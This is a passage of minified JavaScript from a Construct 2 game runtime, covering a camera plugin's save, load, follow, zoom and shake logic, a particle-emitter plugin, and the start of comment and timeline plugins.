                t["lc" + e + "fl"] = this.localCameras[e].followLag, t["lc" + e + "ztc"] = this.localCameras[e].zoomToContain, t["lc" + e + "zmh"] = this.localCameras[e].zoomMarginH, t["lc" + e + "zmv"] = this.localCameras[e].zoomMarginV, t["lc" + e + "zbu"] = this.localCameras[e].zoomBoundU, t["lc" + e + "zbl"] = this.localCameras[e].zoomBoundL, t["lc" + e + "tc"] = this.localCameras[e].transitions.length;
                for (var s = 0; s < this.localCameras[e].transitions.length; s++) t["lc" + e + "t" + s + "tp"] = this.localCameras[e].transitions[s].type, t["lc" + e + "t" + s + "d"] = this.localCameras[e].transitions[s].duration, t["lc" + e + "t" + s + "p1"] = this.localCameras[e].transitions[s].param1, t["lc" + e + "t" + s + "p2"] = this.localCameras[e].transitions[s].param2, t["lc" + e + "t" + s + "p3"] = this.localCameras[e].transitions[s].param3, t["lc" + e + "t" + s + "p4"] = this.localCameras[e].transitions[s].param4, t["lc" + e + "t" + s + "pr"] = this.localCameras[e].transitions[s].progress;
                t["lc" + e + "mtf"] = this.localCameras[e].moveTransFinished, t["lc" + e + "ztf"] = this.localCameras[e].zoomTransFinished, t["lc" + e + "csis"] = this.localCameras[e].isShaking, t["lc" + e + "cssx"] = this.localCameras[e].shakeX, t["lc" + e + "cssy"] = this.localCameras[e].shakeY, t["lc" + e + "cssz"] = this.localCameras[e].shakeZoom, t["lc" + e + "csst"] = this.localCameras[e].shakeTimer, t["lc" + e + "csss"] = this.localCameras[e].shakeStrength, t["lc" + e + "cssmd"] = this.localCameras[e].shakeMaxDeviation, t["lc" + e + "cssmzd"] = this.localCameras[e].shakeMaxZoomDeviation, t["lc" + e + "cssl"] = this.localCameras[e].shakeLength, t["lc" + e + "cssbt"] = this.localCameras[e].shakeBuildTime, t["lc" + e + "cssdt"] = this.localCameras[e].shakeDropTime
            }
            for (e = 0; e < this.globalCameras.length; e++) {
                t["gc" + e + "g"] = this.globalCameras[e].global, t["gc" + e + "n"] = this.globalCameras[e].name, t["gc" + e + "x"] = this.globalCameras[e].x, t["gc" + e + "y"] = this.globalCameras[e].y, t["gc" + e + "s"] = this.globalCameras[e].scale, t["gc" + e + "f"] = this.globalCameras[e].following, t["gc" + e + "foc"] = this.globalCameras[e].followedObjects.length;
                for (i = 0; i < this.globalCameras[e].followedObjects.length; i++) t["gc" + e + "fo" + i] = this.globalCameras[e].followedObjects[i].uid;
                for (n = 0; n < this.globalCameras[e].objectWeights.length; n++) t["gc" + e + "fow" + n] = this.globalCameras[e].objectWeights[n];
                for (r = 0; r < this.globalCameras[e].followedObjectIPs.length; r++) t["gc" + e + "foip" + r] = this.globalCameras[e].followedObjectIPs[r];
                t["gc" + e + "fl"] = this.globalCameras[e].followLag, t["gc" + e + "ztc"] = this.globalCameras[e].zoomToContain, t["gc" + e + "zmh"] = this.globalCameras[e].zoomMarginH, t["gc" + e + "zmv"] = this.globalCameras[e].zoomMarginV, t["gc" + e + "zbu"] = this.globalCameras[e].zoomBoundU, t["gc" + e + "zbl"] = this.globalCameras[e].zoomBoundL, t["gc" + e + "tc"] = this.globalCameras[e].transitions.length;
                for (s = 0; s < this.globalCameras[e].transitions.length; s++) t["gc" + e + "t" + s + "tp"] = this.globalCameras[e].transitions[s].type, t["gc" + e + "t" + s + "d"] = this.globalCameras[e].transitions[s].duration, t["gc" + e + "t" + s + "p1"] = this.globalCameras[e].transitions[s].param1, t["gc" + e + "t" + s + "p2"] = this.globalCameras[e].transitions[s].param2, t["gc" + e + "t" + s + "p3"] = this.globalCameras[e].transitions[s].param3, t["gc" + e + "t" + s + "p4"] = this.globalCameras[e].transitions[s].param4;
                t["gc" + e + "mtf"] = this.globalCameras[e].moveTransFinished, t["gc" + e + "ztf"] = this.globalCameras[e].zoomTransFinished, t["gc" + e + "csis"] = this.globalCameras[e].isShaking, t["gc" + e + "cssx"] = this.globalCameras[e].shakeX, t["gc" + e + "cssy"] = this.globalCameras[e].shakeY, t["gc" + e + "cssz"] = this.globalCameras[e].shakeZoom, t["gc" + e + "csst"] = this.globalCameras[e].shakeTimer, t["gc" + e + "csss"] = this.globalCameras[e].shakeStrength, t["gc" + e + "cssmd"] = this.globalCameras[e].shakeMaxDeviation, t["gc" + e + "cssmzd"] = this.globalCameras[e].shakeMaxZoomDeviation, t["gc" + e + "cssl"] = this.globalCameras[e].shakeLength, t["gc" + e + "cssbt"] = this.globalCameras[e].shakeBuildTime, t["gc" + e + "cssdt"] = this.globalCameras[e].shakeDropTime
            }
            return null != this.activeCamera ? t.ac = this.activeCamera.name : t.ac = "null", null != this.transTarget && (t.tt = this.transTarget.name), t
        }, r.loadFromJSON = function (t) {
            this.localCameras = [], this.globalCameras = [], this.localCameraCount = t.lcc, this.localCameraCountOld = t.olcc;
            for (var n = t.alcc, r = 0; r < n; r++) {
                (p = new i("", 0, 0, 0, !1)).global = t["lc" + r + "g"], p.name = t["lc" + r + "n"], p.x = t["lc" + r + "x"], p.y = t["lc" + r + "y"], p.scale = t["lc" + r + "s"], p.following = t["lc" + r + "f"];
                for (var s = t["lc" + r + "foc"], o = 0; o < s; o++) p.followedObjectUIDs.push(t["lc" + r + "fo" + o]);
                for (var a = 0; a < s; a++) p.objectWeights.push(t["lc" + r + "fow" + a]);
                for (var h = 0; h < s; h++) p.followedObjectIPs.push(t["lc" + r + "foip" + h]);
                p.followLag = t["lc" + r + "fl"], p.zoomToContain = t["lc" + r + "ztc"], p.zoomMarginH = t["lc" + r + "zmh"], p.zoomMarginV = t["lc" + r + "zmv"], p.zoomBoundU = t["lc" + r + "zbu"], p.zoomBoundL = t["lc" + r + "zbl"];
                for (var c = t["lc" + r + "tc"], l = 0; l < c; l++) {
                    (d = new e("", 0, 0, 0, 0)).type = t["lc" + r + "t" + l + "tp"], d.duration = t["lc" + r + "t" + l + "d"], d.param1 = t["lc" + r + "t" + l + "p1"], d.param2 = t["lc" + r + "t" + l + "p2"], d.param3 = t["lc" + r + "t" + l + "p3"], d.param4 = t["lc" + r + "t" + l + "p4"], d.progress = t["lc" + r + "t" + l + "pr"], p.transitions.push(d)
                }
                p.moveTransFinished = t["lc" + r + "mtf"], p.zoomTransFinished = t["lc" + r + "ztf"], p.isShaking = t["lc" + r + "csis"], p.shakeX = t["lc" + r + "cssx"], p.shakeY = t["lc" + r + "cssy"], p.shakeZoom = t["lc" + r + "cssz"], p.shakeTimer = t["lc" + r + "csst"], p.shakeStrength = t["lc" + r + "csss"], p.shakeMaxDeviation = t["lc" + r + "cssmd"], p.shakeMaxZoomDeviation = t["lc" + r + "cssmzd"], p.shakeLength = t["lc" + r + "cssl"], p.shakeBuildTime = t["lc" + r + "cssbt"], p.shakeDropTime = t["lc" + r + "cssdt"], this.localCameras.push(p)
            }
            var u = t.agcc;
            for (r = 0; r < u; r++) {
                var p;
                (p = new i("", 0, 0, 0, !1)).global = t["gc" + r + "g"], p.name = t["gc" + r + "n"], p.x = t["gc" + r + "x"], p.y = t["gc" + r + "y"], p.scale = t["gc" + r + "s"], p.following = t["gc" + r + "f"];
                for (s = t["gc" + r + "foc"], o = 0; o < s; o++) p.followedObjectUIDs.push(t["gc" + r + "fo" + o]);
                for (a = 0; a < s; a++) p.objectWeights.push(t["gc" + r + "fow" + a]);
                for (h = 0; h < s; h++) p.followedObjectIPs.push(t["gc" + r + "foip" + h]);
                p.followLag = t["gc" + r + "fl"], p.zoomToContain = t["gc" + r + "ztc"], p.zoomMarginH = t["gc" + r + "zmh"], p.zoomMarginV = t["gc" + r + "zmv"], p.zoomBoundU = t["gc" + r + "zbu"], p.zoomBoundL = t["gc" + r + "zbl"];
                for (c = t["gc" + r + "tc"], l = 0; l < c; l++) {
                    var d;
                    (d = new e("", 0, 0, 0, 0)).type = t["gc" + r + "t" + l + "tp"], d.duration = t["gc" + r + "t" + l + "d"], d.param1 = t["gc" + r + "t" + l + "p1"], d.param2 = t["gc" + r + "t" + l + "p2"], d.param3 = t["gc" + r + "t" + l + "p3"], d.param4 = t["gc" + r + "t" + l + "p4"], p.transitions.push(d)
                }
                p.moveTransFinished = t["gc" + r + "mtf"], p.zoomTransFinished = t["gc" + r + "ztf"], p.isShaking = t["gc" + r + "csis"], p.shakeX = t["gc" + r + "cssx"], p.shakeY = t["gc" + r + "cssy"], p.shakeZoom = t["gc" + r + "cssz"], p.shakeTimer = t["gc" + r + "csst"], p.shakeStrength = t["gc" + r + "csss"], p.shakeMaxDeviation = t["gc" + r + "cssmd"], p.shakeMaxZoomDeviation = t["gc" + r + "cssmzd"], p.shakeLength = t["gc" + r + "cssl"], p.shakeBuildTime = t["gc" + r + "cssbt"], p.shakeDropTime = t["gc" + r + "cssdt"], this.globalCameras.push(p)
            }
            var f = t.ac;
            this.activeCamera = "null" == f ? null : this.GetCamera(f), t.tcnn && (this.transCamera = this.localCameras.pop(), this.transTarget = this.GetCamera(t.tt))
        }, r.afterLoad = function () {
            for (var t = 0; t < this.localCameras.length; t++)
                for (var e = 0; e < this.localCameras[t].followedObjectUIDs.length; e++) this.localCameras[t].followedObjects.push(this.runtime.getObjectByUID(this.localCameras[t].followedObjectUIDs[e]));
            for (t = 0; t < this.globalCameras.length; t++)
                for (e = 0; e < this.globalCameras[t].followedObjectUIDs.length; e++) this.globalCameras[t].followedObjects.push(this.runtime.getObjectByUID(this.globalCameras[t].followedObjectUIDs[e]))
        }, r.onLayoutChange = function () {
            for (var t = 0; t < this.localCameraCountOld; t++) this.localCameras.shift();
            this.localCameraCount -= this.localCameraCountOld
        }, r.tick = function () {
            this.localCameraCountOld = this.localCameraCount;
            var t = this.runtime.getDt(this);
            0 == t && (t = .1);
            for (var e = 0; e < this.globalCameras.length; e++) this.globalCameras[e].ProcessTransitions(t), this.globalCameras[e].ProcessFollowing(t, this.runtime.original_width, this.runtime.original_height, this.runtime.running_layout), this.globalCameras[e].ShakeCamera(t);
            for (e = 0; e < this.localCameras.length; e++) this.localCameras[e].ProcessTransitions(t), this.localCameras[e].ProcessFollowing(t, this.runtime.original_width, this.runtime.original_height, this.runtime.running_layout), this.localCameras[e].ShakeCamera(t);
            null != this.transCamera && (this.transCamera.UpdateCameraTarget(t, this.transTarget), this.transCamera.ProcessTransitions(t), this.transCamera.moveTransFinished && (this.activeCamera = this.transTarget, this.transCamera = null)), null != this.activeCamera && (this.runtime.running_layout.scrollToX(this.activeCamera.GetX() + this.activeCamera.GetShakeX()), this.runtime.running_layout.scrollToY(this.activeCamera.GetY() + this.activeCamera.GetShakeY()), this.runtime.running_layout.scale = this.activeCamera.scale + this.activeCamera.shakeZoom, this.runtime.redraw = !0)
        }, r.draw = function (t) {}, r.drawGL = function (t) {}, r.GetCamera = function (t) {
            if ("" == t) return this.activeCamera;
            for (var e = this.globalCameras.length - 1; e >= 0; e--)
                if (this.globalCameras[e].GetName() == t) return this.globalCameras[e];
            for (e = this.localCameras.length - 1; e >= 0; e--)
                if (this.localCameras[e].GetName() == t) return this.localCameras[e];
            return null
        }, s.prototype.TransitionFinished = function (t, e) {
            var i = this.GetCamera(t);
            if (null != i) {
                if (0 == e) return i.moveTransFinished;
                if (1 == e) return i.zoomTransFinished
            }
            return !1
        }, s.prototype.TransitionIsInProgress = function (t, e) {
            var i = this.GetCamera(t);
            if (null != i)
                for (var n = 0; n < i.transitions.length; n++) {
                    if ("MOVE" == i.transitions[n].type && 0 == e) return !0;
                    if ("SCALE" == i.transitions[n].type && 1 == e) return !0
                }
            return !1
        }, n.cnds = new s, o.prototype.FollowObject = function (t, e, i, n) {
            if (e) {
                var r = this.GetCamera(t);
                if (null != r) {
                    var s = e.getFirstPicked();
                    if (r.global && !e.global) return void alert("MagiCam:\n\nObject not global - global cameras must follow global objects.");
                    r.followedObjects.push(s), r.objectWeights.push(i), r.followedObjectIPs.push(n)
                }
            }
        }, o.prototype.SetFollowLag = function (t, e) {
            var i = this.GetCamera(t);
            null != i && (i.followLag = 1 - e / 100)
        }, o.prototype.ZoomToContain = function (t, e, i, n, r, s) {
            var o = this.GetCamera(t);
            null != o && (0 == e ? (o.zoomToContain = !0, o.zoomMarginH = i, o.zoomMarginV = n, o.zoomBoundU = r, o.zoomBoundL = s) : o.zoomToContain = !1)
        }, o.prototype.EnableFollowing = function (t, e) {
            var i = this.GetCamera(t);
            null != i && (i.following = 0 == e)
        }, o.prototype.UnfollowObject = function (t, e) {
            if (e) {
                var i = this.GetCamera(t);
                if (null != i)
                    for (var n = e.getFirstPicked(), r = 0; r < i.followedObjects.length; r++)
                        if (i.followedObjects[r] == n) {
                            i.followedObjects.splice(r, 1);
                            break
                        }
            }
        }, o.prototype.CreateLocalCamera = function (t, e, n, r, s) {
            "" != t ? (this.localCameras.push(new i(t, e, n, r, !1)), this.localCameraCount++, 1 == s && (this.activeCamera = this.localCameras[this.localCameras.length - 1], this.runtime.running_layout.scale = this.activeCamera.scale)) : alert("Camera name must not be blank.")
        }, o.prototype.CreateGlobalCamera = function (t, e, n, r, s) {
            "" != t ? null == this.GetCamera(t) && (this.globalCameras.push(new i(t, e, n, r, !0)), 1 == s && (this.activeCamera = this.globalCameras[this.globalCameras.length - 1], this.runtime.running_layout.scrollToX(this.activeCamera.GetX()), this.runtime.running_layout.scrollToY(this.activeCamera.GetY()), this.runtime.running_layout.scale = this.activeCamera.scale)) : alert("Camera name must not be blank.")
        }, o.prototype.SetActiveCamera = function (t) {
            var e = this.GetCamera(t);
            null != e && (this.activeCamera = e, this.runtime.running_layout.scrollToX(e.GetX()), this.runtime.running_layout.scrollToY(e.GetY()), this.runtime.running_layout.scale = e.scale)
        }, o.prototype.SetScrollSmoothing = function (t) {}, o.prototype.SetXPosition = function (t, e) {
            var i = this.GetCamera(t);
            null != i && i.SetX(e)
        }, o.prototype.SetYPosition = function (t, e) {
            var i = this.GetCamera(t);
            null != i && i.SetY(e)
        }, o.prototype.SetPosition = function (t, e, i) {
            var n = this.GetCamera(t);
            null != n && (n.SetX(e), n.SetY(i))
        }, o.prototype.SetZoom = function (t, e) {
            var i = this.GetCamera(t);
            null != i && (i.scale = e)
        }, o.prototype.TransitionToPoint = function (t, i, n, r) {
            var s = this.GetCamera(t);
            if (null != s) {
                for (var o = 0; o < s.transitions.length; o++)
                    if ("MOVE" == s.transitions[o].type) {
                        s.transitions.splice(o, 1);
                        break
                    } s.transitions.push(new e("MOVE", r, i, n, s.GetX(), s.GetY())), s.following = !1, s.zoomToContain = !1
            }
        }, o.prototype.TransitionToZoom = function (t, i, n) {
            var r = this.GetCamera(t);
            if (null != r) {
                for (var s = 0; s < r.transitions.length; s++)
                    if ("SCALE" == r.transitions[s].type) {
                        r.transitions.splice(s, 1);
                        break
                    } r.transitions.push(new e("SCALE", n, i, r.scale, null, null)), r.zoomToContain = !1
            }
        }, o.prototype.TransitionToCamera = function (t, n) {
            var r = this.GetCamera(t);
            null != r && (this.transTarget = r, this.transCamera = new i("transCamera", this.activeCamera.GetX(), this.activeCamera.GetY(), this.activeCamera.scale, !1), this.transCamera.transitions.push(new e("MOVE", n, this.transTarget.GetX(), this.transTarget.GetY(), this.transCamera.GetX(), this.transCamera.GetY())), this.transCamera.transitions.push(new e("SCALE", n, this.transTarget.scale, this.transCamera.scale, null, null)), this.activeCamera = this.transCamera, this.isSwitchingCameras = !0)
        }, o.prototype.ShakeCamera = function (t, e, i, n, r, s, o) {
            var a = this.GetCamera(t);
            null != a && (a.isShaking = !0, a.shakeStrength = e / 100, a.shakeMaxDeviation = i, a.shakeMaxZoomDeviation = n, a.shakeBuildTime = r, a.shakeDropTime = s, a.shakeLength = o, a.shakeTimer = 0)
        }, n.acts = new o, a.prototype.MovementTransitionProgress = function (t, e) {
            var i = this.GetCamera(e);
            if (null != i)
                for (var n = 0; n < i.transitions.length; n++)
                    if ("MOVE" == i.transitions[n].type) return void t.set_float(i.transitions[n].progress);
            t.set_float(0)
        }, a.prototype.ZoomTransitionProgress = function (t, e) {
            var i = this.GetCamera(e);
            if (null != i)
                for (var n = 0; n < i.transitions.length; n++)
                    if ("SCALE" == i.transitions[n].type) return void t.set_float(i.transitions[n].progress);
            t.set_float(0)
        }, a.prototype.GetX = function (t, e) {
            var i = this.GetCamera(e);
            null == i ? t.set_float(0) : t.set_float(i.x)
        }, a.prototype.GetY = function (t, e) {
            var i = this.GetCamera(e);
            null == i ? t.set_float(0) : t.set_float(i.y)
        }, a.prototype.GetZoom = function (t, e) {
            var i = this.GetCamera(e);
            null == i ? t.set_float(0) : t.set_float(i.scale)
        }, a.prototype.GetActiveCamera = function (t) {
            null == this.activeCamera ? t.set_string("null") : t.set_string(this.activeCamera.name)
        }, n.exps = new a
    }(), cr.plugins_.Particles = function (t) {
        this.runtime = t
    },
    function () {
        var t = cr.plugins_.Particles.prototype;
        t.Type = function (t) {
            this.plugin = t, this.runtime = t.runtime
        };
        var e = t.Type.prototype;

        function i(t) {
            this.owner = t, this.active = !1, this.x = 0, this.y = 0, this.speed = 0, this.angle = 0, this.opacity = 1, this.grow = 0, this.size = 0, this.gs = 0, this.age = 0, cr.seal(this)
        }
        e.onCreate = function () {
            this.is_family || (this.texture_img = new Image, this.texture_img.cr_filesize = this.texture_filesize, this.webGL_texture = null, this.runtime.waitForImageLoad(this.texture_img, this.texture_file))
        }, e.onLostWebGLContext = function () {
            this.is_family || (this.webGL_texture = null)
        }, e.onRestoreWebGLContext = function () {
            !this.is_family && this.instances.length && (this.webGL_texture || (this.webGL_texture = this.runtime.glwrap.loadTexture(this.texture_img, !0, this.runtime.linearSampling, this.texture_pixelformat)))
        }, e.loadTextures = function () {
            this.is_family || this.webGL_texture || !this.runtime.glwrap || (this.webGL_texture = this.runtime.glwrap.loadTexture(this.texture_img, !0, this.runtime.linearSampling, this.texture_pixelformat))
        }, e.unloadTextures = function () {
            this.is_family || this.instances.length || !this.webGL_texture || (this.runtime.glwrap.deleteTexture(this.webGL_texture), this.webGL_texture = null)
        }, e.preloadCanvas2D = function (t) {
            t.drawImage(this.texture_img, 0, 0)
        }, i.prototype.init = function () {
            var t = this.owner;
            this.x = t.x - t.xrandom / 2 + Math.random() * t.xrandom, this.y = t.y - t.yrandom / 2 + Math.random() * t.yrandom, this.speed = t.initspeed - t.speedrandom / 2 + Math.random() * t.speedrandom, this.angle = t.angle - t.spraycone / 2 + Math.random() * t.spraycone, this.opacity = t.initopacity, this.size = t.initsize - t.sizerandom / 2 + Math.random() * t.sizerandom, this.grow = t.growrate - t.growrandom / 2 + Math.random() * t.growrandom, this.gs = 0, this.age = 0
        }, i.prototype.tick = function (t) {
            var e = this.owner;
            this.x += Math.cos(this.angle) * this.speed * t, this.y += Math.sin(this.angle) * this.speed * t, this.y += this.gs * t, this.speed += e.acc * t, this.size += this.grow * t, this.gs += e.g * t, this.age += t, this.size < 1 ? this.active = !1 : (0 !== e.lifeanglerandom && (this.angle += Math.random() * e.lifeanglerandom * t - e.lifeanglerandom * t / 2), 0 !== e.lifespeedrandom && (this.speed += Math.random() * e.lifespeedrandom * t - e.lifespeedrandom * t / 2), 0 !== e.lifeopacityrandom && (this.opacity += Math.random() * e.lifeopacityrandom * t - e.lifeopacityrandom * t / 2, this.opacity < 0 ? this.opacity = 0 : this.opacity > 1 && (this.opacity = 1)), e.destroymode <= 1 && this.age >= e.timeout && (this.active = !1), 2 === e.destroymode && this.speed <= 0 && (this.active = !1))
        }, i.prototype.draw = function (t) {
            var e = this.owner.opacity * this.opacity;
            if (0 !== e) {
                0 === this.owner.destroymode && (e *= 1 - this.age / this.owner.timeout), t.globalAlpha = e;
                var i = this.x - this.size / 2,
                    n = this.y - this.size / 2;
                this.owner.runtime.pixel_rounding && (i = i + .5 | 0, n = n + .5 | 0), t.drawImage(this.owner.type.texture_img, i, n, this.size, this.size)
            }
        }, i.prototype.drawGL = function (t) {
            var e = this.owner.opacity * this.opacity;
            0 === this.owner.destroymode && (e *= 1 - this.age / this.owner.timeout);
            var i = this.size,
                n = i * this.owner.particlescale,
                r = this.x - i / 2,
                s = this.y - i / 2;
            this.owner.runtime.pixel_rounding && (r = r + .5 | 0, s = s + .5 | 0), n < 1 || 0 === e || (n < t.minPointSize || n > t.maxPointSize ? (t.setOpacity(e), t.quad(r, s, r + i, s, r + i, s + i, r, s + i)) : t.point(this.x, this.y, n, e))
        }, i.prototype.left = function () {
            return this.x - this.size / 2
        }, i.prototype.right = function () {
            return this.x + this.size / 2
        }, i.prototype.top = function () {
            return this.y - this.size / 2
        }, i.prototype.bottom = function () {
            return this.y + this.size / 2
        }, t.Instance = function (t) {
            this.type = t, this.runtime = t.runtime
        };
        var n = t.Instance.prototype,
            r = [];

        function s() {}

        function o() {}

        function a() {}
        n.onCreate = function () {
            var t = this.properties;
            if (this.rate = t[0], this.spraycone = cr.to_radians(t[1]), this.spraytype = t[2], this.spraying = !0, this.initspeed = t[3], this.initsize = t[4], this.initopacity = t[5] / 100, this.growrate = t[6], this.xrandom = t[7], this.yrandom = t[8], this.speedrandom = t[9], this.sizerandom = t[10], this.growrandom = t[11], this.acc = t[12], this.g = t[13], this.lifeanglerandom = t[14], this.lifespeedrandom = t[15], this.lifeopacityrandom = t[16], this.destroymode = t[17], this.timeout = t[18], this.particleCreateCounter = 0, this.particlescale = 1, this.particleBoxLeft = this.x, this.particleBoxTop = this.y, this.particleBoxRight = this.x, this.particleBoxBottom = this.y, this.add_bbox_changed_callback((function (t) {
                    t.bbox.set(t.particleBoxLeft, t.particleBoxTop, t.particleBoxRight, t.particleBoxBottom), t.bquad.set_from_rect(t.bbox), t.bbox_changed = !1, t.update_collision_cell(), t.update_render_cell()
                })), this.recycled || (this.particles = []), this.runtime.tickMe(this), this.type.loadTextures(), 1 === this.spraytype)
                for (var e = 0; e < this.rate; e++) this.allocateParticle().opacity = 0;
            this.first_tick = !0
        }, n.saveToJSON = function () {
            var t, e, i, n = {
                    r: this.rate,
                    sc: this.spraycone,
                    st: this.spraytype,
                    s: this.spraying,
                    isp: this.initspeed,
                    isz: this.initsize,
                    io: this.initopacity,
                    gr: this.growrate,
                    xr: this.xrandom,
                    yr: this.yrandom,
                    spr: this.speedrandom,
                    szr: this.sizerandom,
                    grnd: this.growrandom,
                    acc: this.acc,
                    g: this.g,
                    lar: this.lifeanglerandom,
                    lsr: this.lifespeedrandom,
                    lor: this.lifeopacityrandom,
                    dm: this.destroymode,
                    to: this.timeout,
                    pcc: this.particleCreateCounter,
                    ft: this.first_tick,
                    p: []
                },
                r = n.p;
            for (t = 0, e = this.particles.length; t < e; t++) i = this.particles[t], r.push([i.x, i.y, i.speed, i.angle, i.opacity, i.grow, i.size, i.gs, i.age]);
            return n
        }, n.loadFromJSON = function (t) {
            var e, i, n, s;
            this.rate = t.r, this.spraycone = t.sc, this.spraytype = t.st, this.spraying = t.s, this.initspeed = t.isp, this.initsize = t.isz, this.initopacity = t.io, this.growrate = t.gr, this.xrandom = t.xr, this.yrandom = t.yr, this.speedrandom = t.spr, this.sizerandom = t.szr, this.growrandom = t.grnd, this.acc = t.acc, this.g = t.g, this.lifeanglerandom = t.lar, this.lifespeedrandom = t.lsr, this.lifeopacityrandom = t.lor, this.destroymode = t.dm, this.timeout = t.to, this.particleCreateCounter = t.pcc, this.first_tick = t.ft, r.push.apply(r, this.particles), cr.clearArray(this.particles);
            var o = t.p;
            for (e = 0, i = o.length; e < i; e++) n = this.allocateParticle(), s = o[e], n.x = s[0], n.y = s[1], n.speed = s[2], n.angle = s[3], n.opacity = s[4], n.grow = s[5], n.size = s[6], n.gs = s[7], n.age = s[8]
        }, n.onDestroy = function () {
            r.push.apply(r, this.particles), cr.clearArray(this.particles)
        }, n.allocateParticle = function () {
            var t;
            return r.length ? (t = r.pop()).owner = this : t = new i(this), this.particles.push(t), t.active = !0, t
        }, n.tick = function () {
            var t, e, i, n, s, o = this.runtime.getDt(this);
            if (0 === this.spraytype && this.spraying)
                for (this.particleCreateCounter += o * this.rate, n = cr.floor(this.particleCreateCounter), this.particleCreateCounter -= n, t = 0; t < n; t++)(i = this.allocateParticle()).init();
            for (this.particleBoxLeft = this.x, this.particleBoxTop = this.y, this.particleBoxRight = this.x, this.particleBoxBottom = this.y, t = 0, s = 0, e = this.particles.length; t < e; t++) i = this.particles[t], this.particles[s] = i, this.runtime.redraw = !0, 1 === this.spraytype && this.first_tick && i.init(), i.tick(o), i.active ? (i.left() < this.particleBoxLeft && (this.particleBoxLeft = i.left()), i.right() > this.particleBoxRight && (this.particleBoxRight = i.right()), i.top() < this.particleBoxTop && (this.particleBoxTop = i.top()), i.bottom() > this.particleBoxBottom && (this.particleBoxBottom = i.bottom()), s++) : r.push(i);
            cr.truncateArray(this.particles, s), this.set_bbox_changed(), this.first_tick = !1, 1 === this.spraytype && 0 === this.particles.length && this.runtime.DestroyInstance(this)
        }, n.draw = function (t) {
            var e, i, n, r = this.layer;
            for (e = 0, i = this.particles.length; e < i; e++)(n = this.particles[e]).right() >= r.viewLeft && n.bottom() >= r.viewTop && n.left() <= r.viewRight && n.top() <= r.viewBottom && n.draw(t)
        }, n.drawGL = function (t) {
            this.particlescale = this.layer.getScale(), t.setTexture(this.type.webGL_texture);
            var e, i, n, r = this.layer;
            for (e = 0, i = this.particles.length; e < i; e++)(n = this.particles[e]).right() >= r.viewLeft && n.bottom() >= r.viewTop && n.left() <= r.viewRight && n.top() <= r.viewBottom && n.drawGL(t)
        }, s.prototype.IsSpraying = function () {
            return this.spraying
        }, t.cnds = new s, o.prototype.SetSpraying = function (t) {
            this.spraying = 0 !== t
        }, o.prototype.SetEffect = function (t) {
            this.blend_mode = t, this.compositeOp = cr.effectToCompositeOp(t), cr.setGLBlend(this, t, this.runtime.gl), this.runtime.redraw = !0
        }, o.prototype.SetRate = function (t) {
            var e, i;
            if (this.rate = t, 1 === this.spraytype && this.first_tick)
                if (t < this.particles.length)
                    for (e = this.particles.length - t, i = 0; i < e; i++) r.push(this.particles.pop());
                else if (t > this.particles.length)
                for (e = t - this.particles.length, i = 0; i < e; i++) this.allocateParticle().opacity = 0
        }, o.prototype.SetSprayCone = function (t) {
            this.spraycone = cr.to_radians(t)
        }, o.prototype.SetInitSpeed = function (t) {
            this.initspeed = t
        }, o.prototype.SetInitSize = function (t) {
            this.initsize = t
        }, o.prototype.SetInitOpacity = function (t) {
            this.initopacity = t / 100
        }, o.prototype.SetGrowRate = function (t) {
            this.growrate = t
        }, o.prototype.SetXRandomiser = function (t) {
            this.xrandom = t
        }, o.prototype.SetYRandomiser = function (t) {
            this.yrandom = t
        }, o.prototype.SetSpeedRandomiser = function (t) {
            this.speedrandom = t
        }, o.prototype.SetSizeRandomiser = function (t) {
            this.sizerandom = t
        }, o.prototype.SetGrowRateRandomiser = function (t) {
            this.growrandom = t
        }, o.prototype.SetParticleAcc = function (t) {
            this.acc = t
        }, o.prototype.SetGravity = function (t) {
            this.g = t
        }, o.prototype.SetAngleRandomiser = function (t) {
            this.lifeanglerandom = t
        }, o.prototype.SetLifeSpeedRandomiser = function (t) {
            this.lifespeedrandom = t
        }, o.prototype.SetOpacityRandomiser = function (t) {
            this.lifeopacityrandom = t
        }, o.prototype.SetTimeout = function (t) {
            this.timeout = t
        }, t.acts = new o, a.prototype.ParticleCount = function (t) {
            t.set_int(this.particles.length)
        }, a.prototype.Rate = function (t) {
            t.set_float(this.rate)
        }, a.prototype.SprayCone = function (t) {
            t.set_float(cr.to_degrees(this.spraycone))
        }, a.prototype.InitSpeed = function (t) {
            t.set_float(this.initspeed)
        }, a.prototype.InitSize = function (t) {
            t.set_float(this.initsize)
        }, a.prototype.InitOpacity = function (t) {
            t.set_float(100 * this.initopacity)
        }, a.prototype.InitGrowRate = function (t) {
            t.set_float(this.growrate)
        }, a.prototype.XRandom = function (t) {
            t.set_float(this.xrandom)
        }, a.prototype.YRandom = function (t) {
            t.set_float(this.yrandom)
        }, a.prototype.InitSpeedRandom = function (t) {
            t.set_float(this.speedrandom)
        }, a.prototype.InitSizeRandom = function (t) {
            t.set_float(this.sizerandom)
        }, a.prototype.InitGrowRandom = function (t) {
            t.set_float(this.growrandom)
        }, a.prototype.ParticleAcceleration = function (t) {
            t.set_float(this.acc)
        }, a.prototype.Gravity = function (t) {
            t.set_float(this.g)
        }, a.prototype.ParticleAngleRandom = function (t) {
            t.set_float(this.lifeanglerandom)
        }, a.prototype.ParticleSpeedRandom = function (t) {
            t.set_float(this.lifespeedrandom)
        }, a.prototype.ParticleOpacityRandom = function (t) {
            t.set_float(this.lifeopacityrandom)
        }, a.prototype.Timeout = function (t) {
            t.set_float(this.timeout)
        }, t.exps = new a
    }(), cr.plugins_.Rex_Comment = function (t) {
        this.runtime = t
    },
    function () {
        var t = cr.plugins_.Rex_Comment.prototype;
        t.Type = function (t) {
            this.plugin = t, this.runtime = t.runtime
        }, t.Type.prototype.onCreate = function () {}, t.Instance = function (t) {
            this.type = t, this.runtime = t.runtime
        };
        var e = t.Instance.prototype;

        function i() {}

        function n() {}
        e.onCreate = function () {}, e.onDestroy = function () {}, t.cnds = new i, i.prototype.NOOP = function () {
            return !0
        }, t.acts = new n, n.prototype.NOOP = function () {}, t.exps = new function () {}
    }(), cr.plugins_.Rex_TimeLine = function (t) {
        this.runtime = t
    },
    function () {
        var t = function () {
                this.lines = []
            },
            e = t.prototype;
        e.alloc = function (t, e) {
            var i;
            return this.lines.length > 0 ? (i = this.lines.pop(), t.LinkTimer(i)) : i = t.CreateTimer(e), i
        }, e.free = function (t) {
            t.timeline = null, this.lines.push(t)
        }, cr.plugins_.Rex_TimeLine.timerCache = new t;
        var i = cr.plugins_.Rex_TimeLine.prototype;
        i.Type = function (t) {
            this.plugin = t, this.runtime = t.runtime
        }, i.Type.prototype.onCreate = function () {}, i.Instance = function (t) {
            this.type = t, this.runtime = t.runtime
        };
        var n = i.Instance.prototype;
        n.onCreate = function () {
